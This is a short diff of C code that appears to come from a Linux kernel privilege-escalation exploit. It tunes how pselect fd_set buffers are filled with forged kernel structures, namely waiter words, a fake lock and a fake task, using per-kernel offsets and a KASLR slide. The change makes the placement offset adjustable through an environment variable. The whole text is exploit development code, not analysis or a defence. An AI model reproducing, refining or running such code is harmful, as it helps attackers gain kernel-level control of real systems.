@@ -42,6 +42,7 @@ uint64_t slide_bootid_before;
 uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
+static int pselect_runtime_shift;
 
 static int route_delay_usec(int attempt) {
   int override = env_int_range("PSELECT_ROUTE_DELAY_USEC", -1, -1, 1000000);
@@ -148,6 +149,13 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 
   int words_per_set = pselect_words_per_set();
 
+  pselect_runtime_shift = PSELECT_WAITER_WORD_SHIFT;
+  int shift_override = env_int_range("PSELECT_SHIFT", -100, -100, 20);
+  if (shift_override != -100) {
+    pselect_runtime_shift = shift_override;
+    pr_info("pselect shift override: %d\n", shift_override);
+  }
+
   /* Use the per-kernel word table from offsets.h */
   for (int i = 0; i < 20 && active_offsets->pselect_words[i].word >= 0; i++) {
     int word = active_offsets->pselect_words[i].word;
@@ -162,7 +170,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
       case WV_WAKE_PRIO: value = 3 | (1ULL << 32); break; /* packed: low32=wake, high32=prio */
       default: value = 0; break;
     }
-    pselect_put_waiter_word(in, out, ex, words_per_set, word, value, "w");
+    int global_word = pselect_runtime_shift + word;
+    int placed = pselect_put_global_word(in, out, ex, words_per_set, global_word, value);
+    if (!placed)
+      pr_warning("pselect cannot place w waiter_word=%d global_word=%d\n", word, global_word);
   }
 }
 
@@ -225,7 +236,7 @@ void do_pselect_fake_lock_route(void) {
             "ex0=%016llx ex1=%016llx ex2=%016llx ex3=%016llx\n",
             route_attempt,
             env_flag("PSELECT_SIMPLE_LAYOUT", 0),
-            PSELECT_WAITER_WORD_SHIFT,
+            pselect_runtime_shift,
             page_base, fake_lock, fake_w0, fake_task,
             (unsigned long long)fdset_get_word(&in, 0),
             (unsigned long long)fdset_get_word(&in, 3),
